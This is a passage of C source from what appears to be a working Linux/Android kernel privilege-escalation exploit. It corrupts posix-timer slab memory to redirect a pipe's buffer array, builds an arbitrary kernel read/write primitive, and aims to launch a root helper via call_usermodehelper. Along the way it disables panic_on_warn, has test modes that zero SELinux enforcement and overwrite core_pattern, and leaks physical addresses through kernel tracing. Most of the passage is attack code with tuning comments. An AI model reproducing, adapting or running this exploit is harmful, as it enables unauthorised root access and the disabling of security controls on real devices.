
        if (lf)
        {
            if (fgets(lb, sizeof(lb), lf))
            {
                char *nl = strchr(lb, '\n');

                if (nl)
                    *nl = 0;
            }
            fclose(lf);
        }
        if (mf)
        {
            char l2[128];

            if (fgets(l2, sizeof(l2), mf))
            {
                l2[strcspn(l2, "\n")] = 0;
                snprintf(mb, sizeof(mb), "%s", l2);
            }
            fclose(mf);
        }
        logf("[probe] loadavg=%s | %s (measurements are only comparable on a "
             "quiet boot)\n", lb, mb);
    }

    /* 1. SLUB discard rate for a batch thread-timer free. */
    {
        enum
        {
            PTIMERS = 3000
        };
        static timer_t t[PTIMERS];
        struct sigevent ev;
        int made = 0, f1 = 0, f0 = 0, slabs;
        long rn;

        int any1 = 0;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        probe_slabinfo("before");
        while (made < PTIMERS &&
               timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &t[made]) == 0)
            made++;
        slabs = made / 31 + 1;
        logf("[probe] created %d thread timers (~%d slabs of 31)\n", made,
             slabs);
        probe_slabinfo("created");
        trace_start();
        for (int i = 0; i < made; i++)
            timer_delete(t[i]);
        trace_stop();
        rn = read_cpu(g_cpu, raw, 48u << 20);
        if (rn > 0)
            probe_scan_frees(raw, (size_t)rn, getpid(), &f1, &f0, &any1);
        logf("[probe] delete batch: order1_own=%d order1_any=%d "
             "order0_own=%d (discard %d/%d slabs)\n", f1, any1, f0, f1,
             slabs);
        probe_slabinfo("deleted");
        /*
         * Discards are lazy: SLUB unfreezes the per-cpu partial list and
         * hits the "empty slab + nr_partial >= min_partial" rule later than
         * the free itself.  Watch a second window before concluding.
         */
        usleep(300000);
        probe_slabinfo("300ms");
        rn = read_cpu(g_cpu, raw, 48u << 20);
        if (rn > 0)
            probe_scan_frees(raw, (size_t)rn, getpid(), &f1, &f0, &any1);
        logf("[probe] +300ms: order1_own=%d order1_any=%d order0_own=%d\n",
             f1, any1, f0);
    }

    /* 2. Which allocation carries an 8 KiB AF_UNIX write? */
    {
        int sp[2];
        static char buf[8192];
        ssize_t w;
        long rn;
        int n = 0;

        memset(buf, 0x41, sizeof(buf));
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) == 0)
        {
            int snd = 16 << 20;

            (void)setsockopt(sp[0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
            (void)setsockopt(sp[1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
            trace_start();
            w = write(sp[0], buf, sizeof(buf));
            trace_stop();
            rn = read_cpu(g_cpu, raw, 48u << 20);
            memset(det, 0, sizeof(det));
            if (rn > 0)
                n = probe_scan_allocs(raw, (size_t)rn, getpid(), det,
                                      sizeof(det));
            logf("[probe] 8KiB unix write=%zd -> %d page_alloc recs:%s\n", w,
                 n, det);
            close(sp[0]);
            close(sp[1]);
        }
        else
            logf("[-] probe: socketpair failed errno=%d\n", errno);
    }
    logf("[probe] done (nothing was written to kernel memory)\n");
    return 0;
}

/*
 * Verify one candidate marker pfn before it is installed as pipe->bufs.
 *
 * A mode-6 plant redirects pipe->bufs at the reclaimed posix-timers slab
 * page (a page whose contents we control) and fills that array with
 * read-only descriptors (len = 0x1000, no CAN_MERGE) pointing at the
 * candidate page.  A pipe read therefore copies the candidate page's first
 * 8 bytes to userspace:
 *
 *   - right candidate: MARK_MAGIC, the value the traced marker write put
 *     there;
 *   - wrong candidate:  8 bytes of an unrelated page -- a read, nothing
 *     more, so the next candidate can be tried without any risk.
 *
 * Nothing is written through the primitive here, which is why this can run
 * before the real read/write window exists.
 */
__attribute__((unused)) static int pipe_verify_marker(
    int rfd, int wfd, unsigned char *page, unsigned char *raw,
    unsigned long long pfn)
{
    static unsigned char pg[0x1000];
    struct plant_res r;
    unsigned long long val = 0;
    ssize_t rn;

    if (!pfn || pfn >= 0x1000000ULL)
        return 0;
    /*
     * The read-only plant is still a probabilistic timer plant.  A
     * retryable miss (r.retry) must be retried against the same pfn;
     * returning immediately turned one missed abort into a marker-verify
     * park on the first device run.
     *
     * Eight attempts: a mode-6 plant spends 48 MiB instead of 125 MiB (see
     * the spray budget in run_plant), so eight of them cost less than the two
     * this used to allow.  A held zombie from a failed attempt is tolerated
     * here, exactly like stage_write(); only a full held table stops the
     * chain.  Probabilistic by design: ~1/3 of plants abort, and the budget
     * is what makes that acceptable.
     */
    for (int attempt = 1; attempt <= 8; attempt++)
    {
        memset(&r, 0, sizeof(r));
        g_pipe_target_page = spage_of_linear(g_base + (pfn << 12));
        g_pipe_target_off = 0;
        g_pipe_write = 0; /* len 0x1000, no CAN_MERGE: read-only */
        logf("[+] marker verify plant pfn=%#llx spage=%#llx try=%d\n", pfn,
             g_pipe_target_page, attempt);
        run_plant(g_pipe_addr + PIPE_INFO_BUF_OFF, 1, 6, &r, raw, 0);
        if (!r.ok)
        {
            logf("[-] marker verify plant failed (retry=%d held=%d) "
                 "try=%d\n", r.retry, g_held, attempt);
            if (!r.retry || held_table_full())
                return 0;
            continue;
        }
        /*
         * No pipe_rearm() here.  The verify's payload is read-only (flags 0,
         * no CAN_MERGE), so a merge write would take the allocating path and
         * push fresh data into the pipe instead of re-arming it -- that is
         * what turned a "bufs not redirected" miss (n=1, val=0x41) into
         * n=-1.  A verify read is 8 bytes out of a 0x1000-length buffer, so
         * it does not advance tail and the ring stays usable on its own.
         */
        (void)wfd;
        errno = 0;
        /*
         * Read the whole page, not 8 bytes.  The marker page carries three
         * distinct magics (0x000/0x800/0xff8), so one successful read tells
         * us which of the three things is wrong when the value is not
         * MARK_MAGIC: pfn wrong (none present), descriptor offset wrong (a
         * magic at another offset), or read path broken (n != 0x1000).
         */
        rn = read(rfd, pg, sizeof(pg));
        val = 0;
        if (rn >= 8)
            memcpy(&val, pg, 8);
        {
            int m2 = 0, m3 = 0;
            unsigned long long v;

            if (rn >= 0x808)
            {
                memcpy(&v, pg + 0x800, 8);
                m2 = v == MARK_MAGIC2;
            }
            if (rn >= 0x1000)
            {
                memcpy(&v, pg + 0xff8, 8);
                m3 = v == MARK_MAGIC3;
            }
            logf("[+] marker verify read n=%zd val=%#llx want=%#llx "
                 "m2=%d m3=%d\n", rn, val, MARK_MAGIC, m2, m3);
        }
        /*
         * A bad read is a miss, not a verdict.  The plant can land (r.ok=1,
         * burst hit) and still leave bufs untouched: that is the early-abort
         * shape, where the exec thread is killed before begin_new_exec()
         * reaches exec_mmap() and its timerqueue is cleaned by the ordinary
         * exit path.  Returning 0 here threw away the whole attempt budget on
         * one such plant (eight configured, one used).
         */
        if (rn == (ssize_t)sizeof(val) && val == MARK_MAGIC)
            return 1;
        if (held_table_full())
            return 0;
        continue;
    }
    return 0;
}

/*
 * umhpipe chain (RiosWesley/SamTimer design): the timer plant gives one
 * controlled 8-byte write, which is used to point pipe->bufs at a fake
 * pipe_buffer and thereby build a stable kernel read/write primitive on a
 * user page.  That primitive reads system_unbound_wq -> dfl_pwq ->
 * worker_pool and links a fake work_struct whose func is
 * call_usermodehelper_exec_work: the kernel then spawns our helper with a
 * genuine root cred -- no cred forgery, no DEFEX race, and the helper's
 * death is an ordinary exit.
 */
static int umhpipe_main(unsigned char *raw)
{
    struct plant_res r;
    int pf[2] = {-1, -1};
    char ch;
    long n;
    unsigned char *mark = (unsigned char *)MAP_FAILED;
    unsigned long long mark_va = 0; /* mark's linear (kernel) alias */
    unsigned long long marker_pfn = 0;
    unsigned long long mcands[16];
    int mpc = 0;
    unsigned long long wq = 0, pwq = 0, pool = 0, val = 0;
    unsigned long long wl_next = 0, wl_prev = 0;
    unsigned int nw = 0, ni = 0;
    unsigned char kb[0x400];
    unsigned long long sym_alias;
    int ready = 0;

    write_ksu_script();
    write_umh_script();
    ensure_pool();
    ensure_raw();
    drain_timers();
    memset(&r, 0, sizeof(r));

    /*
     * e1s runs with panic_on_warn=1; the self-parent (RB_EMPTY_NODE)
     * plants take timerqueue_del()'s WARN_ON_ONCE, so the warning must be
     * defused before the first plant.  The stage script restores it.
     */
    /*
     * As root we can read the sysctl, so never perform the zero write when
     * it is already 0: if the static address/slide were ever wrong, that
     * write would corrupt an unrelated kernel address.  The shipping shell
     * path cannot read the file (permission denied) and still plants.
     */
    /*
     * Write-primitive self test (SAMTIMER_WTEST): one mode-6 plant aimed at
     * core_pattern, whose first 8 bytes are then read back from userspace as
     * root.  core_pattern is a plain static string, so a successful write
     * turns "core" into 8 bytes of the node address -- visible with a single
     * cat, harmless, and completely independent of the pipe, of bufs and of
     * every previous inference about whether the erase reaches its target.
     */
    if (read_panic_on_warn() == 0)
        logf("[+] panic_on_warn already 0; skip pre-plant\n");
    else if (stage_write(0, 0, "panic_on_warn", raw, NULL,
                         PANIC_ON_WARN_STATIC))
        park_forever("panic_on_warn pre-plant failed");

    /*
     * Pre-fault the VMA/page-table once, then let a traced marker write
     * fault the data page back in: that mm_page_alloc is the marker page.
     * The marker gets its OWN trace window, before pipe(): pipe data pages
     * are allocated with GFP_HIGHUSER, which carries __GFP_MOVABLE just
     * like GFP_HIGHUSER_MOVABLE, so a window shared with the pipe prime
     * could not tell the marker page from a pipe page by gfp_flags (both
     * match 0x8).  A separate window removes that ambiguity.
     */
    mark = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mark != MAP_FAILED)
    {
        (void)madvise(mark, 0x1000, MADV_DONTFORK);
        *(unsigned long long *)mark = 0xdeadbeefdeadbeefULL;
        (void)madvise(mark, 0x1000, MADV_DONTNEED);
    }
    for (int ma = 0; ma < 8 && mark != MAP_FAILED && mpc == 0; ma++)
    {
        if (ma)
            (void)madvise(mark, 0x1000, MADV_DONTNEED);
        trace_start();
        *(volatile unsigned long long *)mark = MARK_MAGIC;
        *(volatile unsigned long long *)(mark + 0x800) = MARK_MAGIC2;
        *(volatile unsigned long long *)(mark + 0xff8) = MARK_MAGIC3;
        trace_stop();
        {
            long mn = read_cpu(g_cpu, raw, 48u << 20);

            if (mn > 0)
                mpc = scan_page_alloc_pfns(raw, (size_t)mn, getpid(),
                                           mcands, 16);
            /*
             * Log the trace size: an empty read (tracefs not delivering) and
             * "records present but none match" look identical otherwise, and
             * this window costs no plant, so a miss should be retried rather
             * than parked on.
             */
            logf("[+] marker window %d: trace=%ld bytes, candidates=%d\n",
                 ma + 1, mn, mpc);
        }
    }
    if (mpc > 0)
    {
        /*
         * Pin the page only now.  mlock before the window would defeat
         * madvise(MADV_DONTNEED), so the marker write would not fault and the
         * trace would see no mm_page_alloc at all -- that is exactly the
         * "trace=4096 bytes, candidates=0" run.  After the window the pfn is
         * known, and pinning keeps it valid while the plant allocates a
         * 512 MiB pad, a ~48 MiB spray pool and eight coredumpers.
         */
        if (mlock(mark, 0x1000) != 0)
            logf("[!] mlock(marker) failed errno=%d; pfn may go stale\n",
                 errno);
        logf("[+] marker pfn trace=%#llx (candidates=%d)\n", mcands[0], mpc);
    }
    else if (getuid() == 0 && getenv("SAMTIMER_ROOT_DEBUG"))
        logf("[!] marker trace found nothing; relying on pagemap\n");
    else
        park_forever("user page pfn leak failed");
    /*
     * Root-only debug aid: pagemap reports the marker page's true pfn, so
     * the whole chain can be exercised without the marker verification
     * plant.  Only with SAMTIMER_ROOT_DEBUG set explicitly -- being root is
     * never a prerequisite for the exploit.
     */
    if (getuid() == 0 && getenv("SAMTIMER_ROOT_DEBUG"))
    {
        unsigned long long rp = pagemap_pfn(mark);

        logf("[pagmap] mark=%p pfn=%#llx trace=%#llx\n", mark, rp,
             mcands[0]);
        if (rp && rp < 0x1000000ULL) /* 64 GB physical */
        {
            if (mpc > 15)
                mpc = 15;
            for (int i = mpc; i > 0; i--)
                mcands[i] = mcands[i - 1];
            mcands[0] = rp;
            mpc++;
        }
        else
            logf("[pagmap] pfn out of range; using the trace candidate\n");
    }

    /*
     * Register the pipe.  The prime has to leave head=2/tail=1: the fake
     * pipe_buffer array starts at the rb node, only slots 1..15 can hold a
     * usable descriptor, and slot 0 overlaps the rb_node itself.  Check
     * the three syscall results instead of assuming them -- a failed
     * second write silently leaves the descriptors at an index we cannot
     * use.
     */
    {
        int prime_ok = 0;

        for (int pa = 0; pa < 3 && !prime_ok; pa++)
        {
            ssize_t w1, r1, w2;

            if (pa)
            {
                if (pf[0] >= 0)
                    close(pf[0]);
                if (pf[1] >= 0)
                    close(pf[1]);
                pf[0] = pf[1] = -1;
                g_pipe_addr = 0;
                g_pipe_bufs = 0;
                logf("[+] pipe leak retry %d\n", pa + 1);
            }
            set_pipe_events(1);
            trace_start();
            /*
     * SELinux write test (SAMTIMER_STEST): one zwrite-shaped plant at
     * selinux_state.enforcing.  /sys/fs/selinux/enforce is readable by the
     * shell user, so a successful zero write flips it to 0 and needs neither
     * root nor a working pipe nor a reboot to observe.
     */
    if (getenv("SAMTIMER_STEST"))
    {
        unsigned long long st =
            SELINUX_ENFORCE_ZAP + (unsigned long long)g_slide;
        struct plant_res wr;

        memset(&wr, 0, sizeof(wr));
        setenv("SAMTIMER_WSHAPE", "zwrite", 1);
        run_plant(st, 1, 6, &wr, raw, 0);
        logf("[+] stest target=%#llx ok=%d retry=%d -- now read "
             "/sys/fs/selinux/enforce\n", st, wr.ok, wr.retry);
        park_forever("selinux write test done");
    }
    if (getenv("SAMTIMER_WTEST"))
    {
        logf("[+] wtest begin\n");
        /*
         * Runs after the bootstrap, so g_slide is already known: every
         * earlier attempt targeted CORE_PATTERN_STATIC with slide 0 and the
         * store therefore went to an unmapped address (or to target+8).
         * core_pattern is a static char[256] that root can read and rewrite,
         * so the loop is: reset it, plant at it, read it back, log.  No pipe,
         * no bufs, no external check, and no reboot between shapes.
         */
        static const char *shapes[] = {"canary", "self", "derived", "zero",
                                       "zwrite"};
        unsigned long long tgt =
            CORE_PATTERN_STATIC + (unsigned long long)g_slide;

        for (unsigned si = 0; si < 5; si++)
        {
            char before[64], after[64];
            int landed = 0;

            setenv("SAMTIMER_WSHAPE", shapes[si], 1);
            reset_core_pattern();
            read_core_pattern(before, sizeof(before));
            for (int t = 0; t < 3 && !landed; t++)
            {
                struct plant_res wr;

                memset(&wr, 0, sizeof(wr));
                run_plant(tgt, 1, 6, &wr, raw, 0);
                logf("[+] wtest shape=%s try=%d ok=%d retry=%d\n", shapes[si],
                     t + 1, wr.ok, wr.retry);
                if (wr.ok)
                    landed = 1;
                else if (!wr.retry || held_table_full())
                    break;
            }
            read_core_pattern(after, sizeof(after));
            logf("[+] wtest shape=%s landed=%d core_before='%s' "
                 "core_after='%s' %s\n", shapes[si], landed, before, after,
                 strcmp(before, after) ? "WRITE LANDED" : "no change");
        }
        park_forever("write test matrix done");
    }
    if (pipe(pf) != 0)
                park_forever("pipe() failed");
            fcntl(pf[0], F_SETFL, O_NONBLOCK);
            fcntl(pf[1], F_SETFL, O_NONBLOCK);
            w1 = write(pf[1], "A", 1);
            r1 = read(pf[0], &ch, 1);
            w2 = write(pf[1], "A", 1);
            logf("[pipe] prime w=%zd r=%zd w2=%zd errno=%d\n", w1, r1, w2,
                 errno);
            usleep(20000);
            trace_stop();
            set_pipe_events(0);
            n = read_cpu(g_cpu, raw, 48u << 20);
            logf("[+] piperead trace n=%ld\n", n);
            if (n > 0)
                scan_pipe_alloc(raw, (size_t)n, getpid());
            if (w1 == 1 && r1 == 1 && w2 == 1)
                prime_ok = 1;
            else
                logf("[!] prime incomplete (want head=2/tail=1); new pipe\n");
        }
        if (!prime_ok)
            park_forever("pipe prime state unknown");
    }
    if (!g_pipe_addr)
        park_forever("pipe addr leak failed");
    logf("[+] pipe=%#llx fds=%d/%d\n", g_pipe_addr, pf[0], pf[1]);

    /*
     * Verify the marker pfn before it ever becomes pipe->bufs.  A
     * read-only mode-6 plant points pipe->bufs at the reclaimed timer slab
     * page (a page we control) whose slots 1..15 describe the candidate
     * page; one pipe read then returns the candidate page's first 8 bytes.
     * A wrong candidate only makes the kernel read an unrelated page --
     * nothing is written -- so the candidates can be tried in order
     * without risking a corrupt write into a foreign page.
     */
    {
        int vidx = -1;

        /*
         * Root debug: pagemap reports the marker's real pfn, so skip the
         * verify plant and save one mode-6 pool.  This is a debug-only
         * shortcut -- the shipping path is shell (no pagemap) and always
         * verifies.
         *
         * It was added after a root run whose verify read returned a
         * kernel-text-looking value while trace and pagemap agreed on the
         * pfn.  That is NOT a reason to trust the read path less: if the
         * read really lands on the wrong page with a correct pfn, the
         * bootstrap's first read will fail the same way (see Open
         * questions).  Keep the mismatch visible in the log instead of
         * hiding it behind this bypass.
         */
        if (getuid() == 0 && getenv("SAMTIMER_ROOT_DEBUG"))
        {
            unsigned long long rp = pagemap_pfn(mark);

            if (rp && rp < 0x1000000ULL)
            {
                marker_pfn = rp;
                logf("[+] marker pfn pagemap=%#llx; verify plant skipped\n",
                     rp);
                goto marker_ready;
            }
        }
        for (int k = 0; k < mpc && k < 2 && vidx < 0 && !held_table_full();
             k++)
        {
            /*
             * Trust the trace candidate.  The reference session hit exactly
             * the same false negative we do ("marker verify read n=8
             * val=0x91050268f9400013", kernel text) and resolved it by
             * trusting candidate 0 instead of gating on the read-back; their
             * production shell run then reached SELinux permissive.  The
             * verify stays as a diagnostic (it logs what it sees) but a
             * mismatch no longer ends the run, and the root debug path skips
             * the extra mode-6 plant entirely.
             */
            if (getuid() == 0 && getenv("SAMTIMER_ROOT_DEBUG"))
            {
                vidx = k;
                break;
            }
            /*
             * No verify plant either: it was one mode-6 plant (~125 MB of
             * pool) per candidate and its read-back is the thing that proved
             * unreliable.  The bootstrap that follows re-points bufs anyway,
             * and a wrong candidate shows up as a failed wq read, which parks
             * safely.
             */
            logf("[+] marker candidate %d trusted (no verify plant)\n", k);
            vidx = k;
        }
        if (vidx < 0)
            park_forever("no trace marker candidate");
        marker_pfn = mcands[vidx];
        logf("[+] marker pfn trusted=%#llx\n", marker_pfn);
marker_ready:
        ;
    }

    /*
     * Bootstrap: one plant whose fake pipe_buffer points at the pipe's own
     * page with CAN_MERGE; the 8-byte write then merges the user page's
     * linear address into pipe->bufs.  From then on pipe->bufs points at
     * our user page, which is stable, and all reads/writes edit the fake
     * pipe_buffer there from userspace.  No more fragile plants.
     *
     * The write is deterministic now: the marker pfn is verified, the
     * prime was checked (head=2/tail=1), and the plant fills slots 1..15,
     * so pipe_write's merge path always finds a CAN_MERGE descriptor at
     * (head-1)&15.  A merge that silently fell through would instead
     * allocate a fresh buffer and leave bufs on the reclaimed slab page,
     * which is exactly the state that used to oops later.
     */
    {
        unsigned long long bufs_addr = g_pipe_addr + PIPE_INFO_BUF_OFF;
        unsigned long long pipe_page = bufs_addr & ~0xfffULL;
        unsigned int pipe_off = (unsigned int)(bufs_addr & 0xfffULL);
        int bn = -1, berr = 0;

        /*
         * The debug path has pagemap for the marker, so the bootstrap does
         * not actually need the KASLR slide; the phys scan can try the
         * fixed load addresses.  Keep the slide requirement for the real
         * shell path.
         */
        if (mark == (unsigned char *)MAP_FAILED || !marker_pfn ||
            marker_pfn >= 0x1000000ULL ||
            (!g_slide_set &&
             !(getuid() == 0 && getenv("SAMTIMER_ROOT_DEBUG"))))
            park_forever("umh missing bootstrap state");
        mark_va = g_base + (marker_pfn << 12);
        memset(mark, 0, 0x1000);
        *(unsigned long long *)mark = MARK_MAGIC;
        user_buf_set(mark, spage_of_linear(pipe_page), pipe_off, 0, 0x10);
        g_pipe_target_page = spage_of_linear(pipe_page);
        g_pipe_target_off = pipe_off;
        g_pipe_write = 1;
        logf("[+] umh bootstrap plant pipe=%#llx bufs_addr=%#llx page=%#llx "
             "off=%#x mark=%p markva=%#llx pfn=%#llx\n", g_pipe_addr,
             bufs_addr, pipe_page, pipe_off, mark, mark_va, marker_pfn);
        {
            int boot_ok = 0;

            /*
             * Four attempts.  Each run_plant() forks a *fresh* victim (fresh
             * task, fresh timerqueue), so there is no cross-attempt stale-node
             * pollution -- the old "same task's queue" warning applied to a
             * code path that reused one victim.  A mode-6 plant keeps ~48 MiB
             * in the keep pool until the merge is confirmed, so four attempts
             * are ~192 MiB worst case, well within this phone's RAM.  The
             * trigger is ~1-in-4 per attempt, so four tries lift the per-boot
             * success from ~44% to ~68% -- the cheapest way to cut reboot
             * cycles while the injection itself is the thing under test.
             */
            for (int ba = 0; ba < 4; ba++)
            {
                memset(&r, 0, sizeof(r));
                run_plant(g_pipe_addr + PIPE_INFO_BUF_OFF, 1, 6, &r, raw,
                          0);
                logf("[+] umh bootstrap plant ok=%d retry=%d attempt=%d "
                     "held=%d\n", r.ok, r.retry, ba + 1, g_held);
                if (!r.ok)
                {
                    /*
                     * A failed plant means pipe->bufs was not (reliably)
                     * redirected; a userspace write() would only fill the
                     * original pipe page and look like progress.  Retry a
                     * fresh victim when the plant is retryable (a held zombie
                     * from the failed attempt is tolerated, like
                     * stage_write()); two attempts only, for the same memory
                     * reason as pipe_verify_marker().
                     */
                    if (!r.retry || held_table_full())
                        break;
                    continue;
                }
                /*
                 * fd identity: pipe_write never appears in the kprobe trace
                 * for this process, so check what pf[1] actually is at this
                 * moment.  A "pipe:[N]" target means the fd is still the
                 * pipe; anything else (a regular file, /dev/null, a stale
                 * tracefs handle) explains why write() returns 8 without the
                 * pipe driver ever running.
                 */
                /*
                 * The plant's own trace_stop() left tracing_on at 0, so the
                 * kprobes would record nothing for the merge.  Re-enable it
                 * here, right before the write (root required).
                 */
                if (getenv("SAMTIMER_STOP_AFTER_MERGE"))
                {
                    int tf = open("/sys/kernel/tracing/tracing_on", O_WRONLY);
                    if (tf >= 0) { (void)write(tf, "1", 1); close(tf); }
                }
                {
                    char lp[64], tgt[80];
                    int ln;

                    for (int fi = 0; fi < 2; fi++)
                    {
                        snprintf(lp, sizeof(lp), "/proc/self/fd/%d", pf[fi]);
                        ln = (int)readlink(lp, tgt, sizeof(tgt) - 1);
                        if (ln > 0)
                        {
                            tgt[ln] = 0;
                            logf("[+] pf[%d]=%d -> %s\n", fi, pf[fi], tgt);
                        }
                        else
                            logf("[!] pf[%d]=%d readlink failed errno=%d\n", fi,
                                 pf[fi], errno);
                    }
                }
                {
                    struct stat st;
                    int ton = -1;
                    int tf = open("/sys/kernel/tracing/tracing_on", O_RDONLY);

                    if (tf >= 0)
                    {
                        char cb[8] = {0};
                        if (read(tf, cb, sizeof(cb) - 1) > 0)
                            ton = cb[0] - '0';
                        close(tf);
                    }
                    if (fstat(pf[1], &st) == 0)
                        logf("[+] pre-merge: tracing_on=%d pf[1] mode=%#o "
                             "isfifo=%d\n", ton, (unsigned)st.st_mode,
                             S_ISFIFO(st.st_mode) ? 1 : 0);
                    else
                        logf("[!] pre-merge: tracing_on=%d fstat failed "
                             "errno=%d\n", ton, errno);
                }
                /*
                 * Sanity: does a pipe write from *this* process produce a
                 * pipe_write trace record at all?  A scratch pipe avoids
                 * disturbing the ring; if this one is traced and the merge is
                 * not, the merge fd/path is the anomaly, not the probe.
                 */
                if (getenv("SAMTIMER_STOP_AFTER_MERGE"))
                {
                    int tp[2];

                    if (pipe(tp) == 0)
                    {
                        char z = 'Z';
                        ssize_t tw = write(tp[1], &z, 1);

                        logf("[+] scratch pipe write n=%zd fd=%d\n", tw,
                             tp[1]);
                        close(tp[0]);
                        close(tp[1]);
                    }
                }
                errno = 0;
                bn = (int)write(pf[1], &mark_va, sizeof(mark_va));
                berr = errno;
                logf("[+] umh bootstrap write n=%d errno=%d attempt=%d\n",
                     bn, berr, ba + 1);
                /*
                 * The merge stores mark_va into pipe->bufs, so from here on the
                 * array is our page and the rb node inside it is dead: filling
                 * slot 0 becomes safe and makes the read side independent of
                 * wherever pipe->tail happens to point.
                 */
                if (bn == (int)sizeof(mark_va))
                    g_bufs_ours = 1;
                /*
                 * Decisive, crash-free check: FIONREAD sums the lengths the
                 * kernel sees in the array behind pipe->bufs.  If the plant
                 * redirected bufs to our page the bootstrap descriptors have
                 * len 0, so the answer is 0; if bufs is still the real array
                 * the prime byte plus the merged 8 bytes add up to 9.
                 */
                {
                    int av = -1;

                    /*
                     * Sentinel instead of a guess: install slots with a
                     * unique length (0x123).  If the kernel sums *our* page,
                     * FIONREAD returns exactly that value; the real array can
                     * only ever return 8 or 9, which the earlier 8-vs-9
                     * comparison could not separate.
                     */
                    user_buf_set(mark, spage_of_linear(bufs_addr),
                                 (unsigned int)((bufs_addr - g_base) & 0xfffULL),
                                 0x123, 0);
                    if (ioctl(pf[0], FIONREAD, &av) == 0)
                        logf("[+] bufs-state: FIONREAD=%d %s\n", av,
                             av == 0x123 ? "(sentinel -> bufs IS our page)"
                                         : "(not our page)");
                }
                /*
                 * Diagnostic stop, immediately after the merge and before the
                 * verification read: the read is what resets the device when
                 * bufs was not redirected, and it would destroy the kprobe
                 * trace before it can be read back.
                 */
                if (getenv("SAMTIMER_STOP_AFTER_MERGE"))
                    park_forever("stop after merge (diagnostic)");
                if (bn != (int)sizeof(mark_va))
                {
                    if (!r.retry || held_table_full())
                        break;
                    continue;
                }
                /*
                 * Verify the merge actually replaced pipe->bufs, exactly as
                 * 19c70f0 (the build that reached SELinux permissive) and
                 * 58dde79 (the build that got pipefake to child uid 0) did.
                 * A successful write() only means the merge buffer was
                 * found: if the slot selected by pipe->tail was not our fake
                 * array, bufs still points at the original array and the
                 * first read returns pipe-page bytes ("markva|0x41").  That
                 * is a failed plant, not a working pipe, so retry it.
                 */
                {
                    unsigned long long chk = 0;
                    int avail = -1;
                    int rerr;
                    int rn;

                    (void)ioctl(pf[0], FIONREAD, &avail);
                    errno = 0;
                    if (getenv("SAMTIMER_WTEST"))
                    {
                        /*
                         * The write test does not need a working pipe: this
                         * read picks a zero descriptor whenever bufs was not
                         * redirected and would fault in ops->confirm before
                         * the test ever runs.
                         */
                        boot_ok = 1;
                        break;
                    }
                    rn = user_pipe_read(pf[0], mark,
                                        g_pipe_addr + PIPE_INFO_BUF_OFF, &chk,
                                        sizeof(chk));
                    rerr = errno;

                    if (rn == (int)sizeof(chk) && chk == mark_va)
                    {
                        logf("[+] umh pipe->bufs verified=%#llx attempt=%d\n",
                             chk, ba + 1);
                        boot_ok = 1;
                        break;
                    }
                    logf("[!] umh bootstrap verify failed: n=%d errno=%d "
                         "bufs=%#llx avail=%d attempt=%d\n", rn, rerr, chk,
                         avail, ba + 1);
                    /*
                     * Under SAMTIMER_WTEST the merge does not matter: the point
                     * is to exercise the write primitive with a slide that the
                     * plant just established, so keep going instead of parking.
                     */
                    if (getenv("SAMTIMER_WTEST"))
                    {
                        boot_ok = 1;
                        break;
                    }
                    if (!r.retry || held_table_full())
                        break;
                    continue;
                }
            }
            if (!boot_ok)
                park_forever("umh pipe bufs bootstrap failed");
            /*
             * Deterministic ring position, as in 19c70f0: head=2/tail=1
             * selects slot 1, which user_buf_set refills on every read and
             * write.  Without this the verification read above can leave the
             * tail elsewhere.
             */
            {
                unsigned int two = 2, one = 1;

                user_pipe_write(pf[1], mark, g_pipe_addr + PIPE_HEAD_OFF, &two,
                                sizeof(two));
                user_pipe_write(pf[1], mark, g_pipe_addr + PIPE_TAIL_OFF, &one,
                                sizeof(one));
                logf("[+] umh pipe ring head=%u tail=%u\n", two, one);
            }
        }
        /*
         * No readback and no head/tail "normalisation" write here.  Both
         * would dereference pipe->bufs, so neither can distinguish "merge
         * landed" from "merge did not land" without crashing in the second
         * case -- and if the merge did not land, the array the read would
         * pick belongs to whatever page the erase did write, not to us.
         * The merge is deterministic instead: the pfn above is verified,
         * the prime left head=2/tail=1, and the plant fills slots 1..15
         * with CAN_MERGE descriptors, so pipe_write's merge path always
         * finds one.
         *
         * The prime was checked
         * and slots 1..15 of the fake array hold the identical descriptor,
         * so any ring index in 1..15 works for read() (tail & 15) and for
         * the merge path ((head-1) & 15).  Writing pipe->head/tail here
         * would be the first real dereference of bufs and could only add a
         * way to corrupt the pipe when the merge had not landed, so leave
         * the ring where the verified prime put it.
         *
         * bufs now points at the user page, so the spray pool can be
         * released (it also holds the timer slab pages the mode-6 plants
         * used, which are no longer referenced).
         */
        g_safe_rfd = pf[0];
        g_safe_wfd = pf[1];
        g_safe_page = mark;
        /*
         * bufs is *not* on the marker page after the merge: the erase stored
         * the node address (V+0x78) into it, and the fake pipe_buffer array
         * lives at that node inside the reclaimed keep-pool page.  So the
         * keep pool must stay allocated for the whole pipe chain -- draining
         * it here frees the array the next read dereferences (observed as an
         * instant reset on the first system_unbound_wq read).  Only
         * pipe_restore(), which puts bufs back on the real array, can clear
         * g_keep_bufs.
         */
        drain_spray(0);
        logf("[+] bootstrap done: bufs=%#llx pool released\n", mark_va);
        {
        }
    }
    if (g_pipe_fake)
        pipefake_install(pf[0], pf[1], mark, mark_va, raw);

    /* All following operations use the user-page fake buffer.  The kernel
     * phys base is a bootloader constant; validate it read-only -- only a
     * candidate whose wq slot reads back as a linear pointer is accepted,
     * and nothing is written until it matches. */
    {
        static const unsigned long long cands[] = { KERNEL_PHYS_CANDIDATES };
        int found = 0;

        unsigned long long nfixed = sizeof(cands) / sizeof(cands[0]);
        /*
         * Only the low 2 GiB.  Walking the whole 64 GiB window reads physical
         * holes; the vmemmap arithmetic still yields a struct page, and the
         * copy then faults on an unmapped linear address -- the oops that
         * killed the scan on its first pass.  19c70f0 never scanned at all:
         * it tried the fixed candidates only, and 0xa8000000 + slide is the
         * one that matches on this device.
         *
         * The grid AND some fixed guesses (0xa0000000, ...) are still RAM
         * holes and fault the same way (observed 0xffffff8022011aa0 in
         * __arch_copy_to_user).  So try the known-good 0xa8000000 + slide
         * FIRST, keep only the fixed candidates (raw and +slide), and never
         * walk the grid: a hole read is a hard oops, not a clean rejection.
         */
        unsigned long long total =
            1 + 2 * nfixed; /* known base, then fixed raw, then fixed +slide */
        unsigned long long idx;

        logf("[+] phys scan: known=%#llx + %d fixed x (raw,+slide)\n",
